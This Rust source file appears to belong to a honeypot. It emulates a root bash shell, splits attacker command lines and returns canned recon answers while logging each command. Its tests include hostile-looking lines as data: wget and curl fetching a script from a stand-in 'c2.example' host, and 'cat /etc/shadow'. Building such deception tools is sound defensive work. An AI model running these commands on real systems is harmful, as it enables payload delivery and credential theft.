// SPDX-License-Identifier: MIT OR Apache-2.0
//! The fake shell: a command line split where bash would run separate
//! commands, and canned answers to what a bot runs first. The line is
//! the client's, so it is hostile; it is already printable text.

/// The host the shell claims to be, from the real one.
pub struct Host {
    /// Short form, as the prompt shows it.
    pub name: String,
    /// `uname -r` and `uname -v`.
    pub release: String,
    pub version: String,
    pub arch: String,
}

/// The most one line prints, however many commands it holds.
pub const MAX_OUT: usize = 16 * 1024;

/// What running a line did.
#[derive(Debug, PartialEq)]
pub struct Ran {
    pub out: String,
    /// Of the last command run.
    pub status: u32,
    /// `exit` or `logout`: the shell ends after this line's output.
    pub exit: bool,
}

const OS_RELEASE: &str = r#"NAME="Rocky Linux"
VERSION="10.2 (Red Quartz)"
RELEASE_TYPE="stable"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="10.2"
PLATFORM_ID="platform:el10"
PRETTY_NAME="Rocky Linux 10.2 (Red Quartz)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:10::baseos"
HOME_URL="https://rockylinux.org/"
VENDOR_NAME="RESF"
VENDOR_URL="https://resf.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2035-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-10"
ROCKY_SUPPORT_PRODUCT_VERSION="10.2"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="10.2"
"#;

const PS: &str = "    PID TTY          TIME CMD\n   2211 pts/0    00:00:00 bash\n   \
    2302 pts/0    00:00:00 ps\n";

const CURL: &str = "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  \
    Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\
    100  1043  100  1043    0     0   9935      0 --:--:-- --:--:-- --:--:--  9933\n";

/// The commands in `line`, each with whether its output goes into a
/// pipe. A separator inside quotes doesn't split.
pub fn split(line: &str) -> Vec<(&str, bool)> {
    fn push<'a>(cmds: &mut Vec<(&'a str, bool)>, c: &'a str, piped: bool) {
        let c = c.trim();
        if !c.is_empty() {
            cmds.push((c, piped));
        }
    }
    let b = line.as_bytes();
    let mut cmds = Vec::new();
    let (mut start, mut i, mut quote) = (0, 0, None);
    while let Some(&c) = b.get(i) {
        i += 1;
        if let Some(q) = quote {
            quote = (c != q).then_some(q);
            continue;
        }
        // Every separator is ASCII, so each cut is on a char boundary.
        let (len, piped) = match (c, b.get(i)) {
            (b'\'' | b'"', _) => {
                quote = Some(c);
                continue;
            }
            (b'&', Some(b'&')) | (b'|', Some(b'|')) => (2, false),
            (b';', _) => (1, false),
            (b'|', _) => (1, true),
            _ => continue,
        };
        push(&mut cmds, &line[start..i - 1], piped);
        i += len - 1;
        start = i;
    }
    push(&mut cmds, &line[start..], false);
    cmds
}

/// What `wget` saves a URL as.
fn saved_as(args: &[&str]) -> String {
    let url = args
        .iter()
        .rev()
        .find(|a| !a.starts_with('-'))
        .unwrap_or(&"");
    let path = url.split(['?', '#']).next().unwrap_or("");
    let path = path.split_once("://").map_or(path, |(_, p)| p);
    match path.rsplit_once('/') {
        Some((_, f)) if !f.is_empty() => f.to_string(),
        _ => "index.html".into(),
    }
}

/// One command's output and status, and whether it ends the shell.
fn answer(cmd: &str, host: &Host) -> (String, u32, bool) {
    let mut words = cmd.split_whitespace();
    let name = words.next().unwrap_or("");
    let args: Vec<&str> = words.collect();
    let flag = |f| args.iter().any(|a| a.starts_with('-') && a.contains(f));
    let out = match name {
        "uname" if flag('a') => format!(
            "Linux {} {} {} {a} {a} {a} GNU/Linux\n",
            host.name,
            host.release,
            host.version,
            a = host.arch
        ),
        "uname" => "Linux\n".into(),
        "id" => "uid=0(root) gid=0(root) groups=0(root) \
                 context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n"
            .into(),
        "whoami" => "root\n".into(),
        "cat" => {
            let mut status = 0;
            let out = args
                .iter()
                .map(|&a| {
                    if a == "/etc/os-release" {
                        OS_RELEASE.into()
                    } else {
                        status = 1;
                        format!("cat: {a}: No such file or directory\n")
                    }
                })
                .collect();
            return (out, status, false);
        }
        "ls" => "anaconda-ks.cfg\n".into(),
        "pwd" => "/root\n".into(),
        "ps" => PS.into(),
        "w" => {
            let t = time::OffsetDateTime::now_utc();
            format!(
                " {:02}:{:02}:{:02} up 41 days,  3:07,  1 user,  load average: 0.00, 0.01, 0.05\n\
                 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n\
                 root     pts/0    -                {:02}:{:02}    0.00s  0.01s  0.00s w\n",
                t.hour(),
                t.minute(),
                t.second(),
                t.hour(),
                t.minute()
            )
        }
        "wget" => {
            let f = saved_as(&args);
            format!("Saving to: '{f}'\n\n'{f}' saved [1043/1043]\n\n")
        }
        "curl" => CURL.into(),
        "echo" => args.join(" ") + "\n",
        "exit" | "logout" => return (String::new(), 0, true),
        "cd" => String::new(),
        _ => return (format!("bash: {name}: command not found\n"), 127, false),
    };
    (out, 0, false)
}

/// Runs each command in `line`, telling `each` about it first.
pub fn run(line: &str, host: &Host, mut each: impl FnMut(&str)) -> Ran {
    let mut r = Ran {
        out: String::new(),
        status: 0,
        exit: false,
    };
    for (cmd, piped) in split(line) {
        each(cmd);
        let (out, status, exit) = answer(cmd, host);
        // Piped output went to the next command, which ignores it.
        if !piped && r.out.len() + out.len() <= MAX_OUT {
            r.out += &out;
        }
        r.status = status;
        if exit {
            r.exit = true;
            break;
        }
    }
    r
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    pub fn host() -> Host {
        Host {
            name: "web1".into(),
            release: "6.12.0-55.el10.x86_64".into(),
            version: "#1 SMP PREEMPT_DYNAMIC".into(),
            arch: "x86_64".into(),
        }
    }

    fn ran(line: &str) -> (Ran, Vec<String>) {
        let mut seen = Vec::new();
        let r = run(line, &host(), |c| seen.push(c.to_string()));
        (r, seen)
    }

    #[test]
    fn a_line_splits_where_bash_would_run_another_command() {
        assert_eq!(
            split("uname -a; id && cat /etc/os-release | head -1"),
            [
                ("uname -a", false),
                ("id", false),
                ("cat /etc/os-release", true),
                ("head -1", false)
            ]
        );
        assert_eq!(split("a || b"), [("a", false), ("b", false)]);
        assert_eq!(
            split(r#"echo "a;b" 'c|d' | x"#),
            [(r#"echo "a;b" 'c|d'"#, true), ("x", false)]
        );
        // An unclosed quote runs to the end, as bash would ask for more.
        assert_eq!(split("echo 'a;b"), [("echo 'a;b", false)]);
        for empty in ["", "   ", ";;", "&& ||", "|"] {
            assert!(split(empty).is_empty(), "{empty:?}");
        }
        assert_eq!(split("ü;é"), [("ü", false), ("é", false)]);
    }

    #[test]
    fn recon_gets_plausible_answers_and_each_command_is_seen() {
        let (r, seen) = ran("uname -a; id && cat /etc/os-release | head -1");
        assert_eq!(seen, ["uname -a", "id", "cat /etc/os-release", "head -1"]);
        assert_eq!(
            r.out,
            "Linux web1 6.12.0-55.el10.x86_64 #1 SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 \
             GNU/Linux\nuid=0(root) gid=0(root) groups=0(root) \
             context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n\
             bash: head: command not found\n"
        );
        assert_eq!((r.status, r.exit), (127, false));
        for (line, has) in [
            ("whoami", "root\n"),
            ("pwd", "/root\n"),
            ("uname", "Linux\n"),
            (
                "cat /etc/os-release",
                "PRETTY_NAME=\"Rocky Linux 10.2 (Red Quartz)\"",
            ),
            (
                "cat /etc/shadow",
                "cat: /etc/shadow: No such file or directory\n",
            ),
            ("ls -la", "anaconda-ks.cfg"),
            ("ps aux", " bash\n"),
            ("w", "load average"),
            ("wget -q http://c2.example/x.sh", "'x.sh' saved"),
            ("wget http://c2.example/", "'index.html' saved"),
            ("curl -O http://c2.example/x.sh", "100 "),
            ("echo hi  there", "hi there\n"),
        ] {
            let (r, _) = ran(line);
            assert!(r.out.contains(has), "{line}: {:?}", r.out);
        }
        assert_eq!(ran("cd /tmp").0.out, "");
    }

    #[test]
    fn exit_ends_the_line_there() {
        let (r, seen) = ran("id; exit; whoami");
        assert!(r.exit);
        assert_eq!(seen, ["id", "exit"]);
        assert!(!r.out.contains("root\n"));
        assert!(ran("logout").0.exit);
    }

    #[test]
    fn one_line_prints_at_most_max_out() {
        let line = "cat /etc/os-release;".repeat(200);
        let (r, seen) = ran(&line);
        assert!(r.out.len() <= MAX_OUT, "{}", r.out.len());
        assert!(!r.out.is_empty());
        // Every command is still seen.
        assert_eq!(seen.len(), 200);
    }
}
